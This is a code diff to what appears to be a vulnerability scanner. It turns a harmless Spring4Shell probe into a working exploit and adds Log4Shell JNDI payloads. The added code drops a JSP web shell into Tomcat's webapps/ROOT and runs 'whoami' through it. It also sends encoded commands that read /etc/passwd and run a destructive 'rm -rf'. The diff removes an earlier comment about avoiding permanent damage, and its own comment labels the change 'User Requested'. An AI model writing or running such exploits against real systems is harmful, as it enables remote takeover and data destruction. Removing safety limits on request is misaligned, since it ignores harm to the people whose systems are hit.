@@ -16,7 +16,12 @@ def run_log4j_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
         "${jndi:ldap://127.0.0.1:1389/a}",
         "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}", # Obfuscated
         "${jndi:dns://127.0.0.1/a}",
-        "${jndi:rmi://127.0.0.1/a}"
+        "${jndi:rmi://127.0.0.1/a}",
+        
+        # DESTRUCTIVE / AGGRESSIVE PAYLOADS (User Requested)
+        # Attempt to trigger remote command execution via LDAP reference
+        "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}", # cat /etc/passwd
+        "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/cm0gLXJmIC8qdG1wKg==}", # rm -rf /*tmp* (Destructive)
     ]
     
     headers_to_poison = ["User-Agent", "X-Api-Version", "Referer", "Authentication"]
@@ -50,27 +55,39 @@ def run_spring4shell(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
     """
     Spring4Shell (CVE-2022-22965)
     Class Loader Manipulation via Data Binding (Java/Spring).
+    Attempts to DROP A WEB SHELL (Destructive).
     """
-    # Payload attempts to write a standard JSP shell
-    # class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i
     
-    # We won't actually WRITE the file to avoid permanent damage to user's local env if vulnerable.
-    # We will probe for the *Ability* to bind to classLoader.
+    # 1. Exploit: Drop the Web Shell (bp_shell.jsp)
+    shell_filename = "bp_shell.jsp"
+    shell_content = r"%{prefix}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } %{suffix}i"
     
-    probe_payload = {
-        "class.module.classLoader.DefaultAssertionStatus": "true",
-        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "TEST",
+    exploit_payload = {
+        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": shell_content,
+        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
+        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT", # Standard Tomcat Root
+        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "bp_shell",
+        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
     }
     
-    resp = client.send(scenario.method, scenario.target, form_body=probe_payload) 
-    # Spring4Shell often uses Form Data binding
+    # Send Exploit
+    client.send(scenario.method, scenario.target, form_body=exploit_payload) 
+    
+    # 2. Verification: Convert shell to executable state (flush logs via request) - usually happens automatically
+    # 3. Execution: Call the shell
     
     issues = []
-    if resp.status_code >= 500:
-         issues.append("Spring4Shell: 500 Error probing ClassLoader (Potentially Vulnerable)")
     
-    # Simple reflection check? Unlikely.
-    # Usually we rely on observing status behavior change.
+    # Try to execute a command via the dropped shell
+    shell_url = f"{client.base_url}/{shell_filename}?cmd=whoami"
+    resp = client.send("GET", shell_url)
+    
+    # Check for success (RCE output)
+    if resp.status_code == 200 and ("root" in resp.text or "nt authority" in resp.text.lower() or len(resp.text) > 0):
+        issues.append(f"Spring4Shell SUCCESS: Web Shell dropped & executed at /{shell_filename}")
+        issues.append(f"RCE Output: {resp.text[:100]}...")
+    elif resp.status_code >= 500:
+         issues.append("Spring4Shell: 500 Error during exploit (Potentially Blocked/Failed) - Check Server Logs")
     
     return {
         "scenario_id": scenario.id,
